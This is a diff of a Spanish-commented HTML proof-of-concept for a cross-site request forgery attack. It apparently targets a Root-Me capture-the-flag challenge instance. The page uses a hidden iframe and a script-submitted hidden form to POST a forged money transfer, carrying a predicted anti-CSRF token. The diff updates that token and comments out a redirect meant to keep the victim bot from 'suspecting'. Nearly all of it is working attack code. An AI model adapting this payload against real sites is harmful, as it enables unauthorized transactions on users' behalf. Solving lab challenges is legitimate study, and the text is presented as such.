@@ -12,7 +12,7 @@
     <iframe name="hidden_frame" id="hidden_frame" style="display:block; width: 100%; height: 100vh;"></iframe>
 
     <form id="csrf_form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST" target="hidden_frame">
-        <input type="hidden" name="token" value="6634eb074300bf02000000" />
+        <input type="hidden" name="token" value="6634f9174300bf02000000" />
         <input type="hidden" name="recipient" value="test" />
         <input type="hidden" name="amount" value="1337" />
     </form>
@@ -23,10 +23,10 @@
             document.getElementById('csrf_form').submit();
             console.log("Ataque enviado.");
             
-            // Opcional: Redirigir al bot a la página real después de 3 segundos para que no sospeche
-            setTimeout(function(){
-                window.location.href = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/rich-club";
-            }, 3000);
+            // // Opcional: Redirigir al bot a la página real después de 3 segundos para que no sospeche
+            // setTimeout(function(){
+            //     window.location.href = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/rich-club";
+            // }, 3000);
         };
     </script>
 </body>
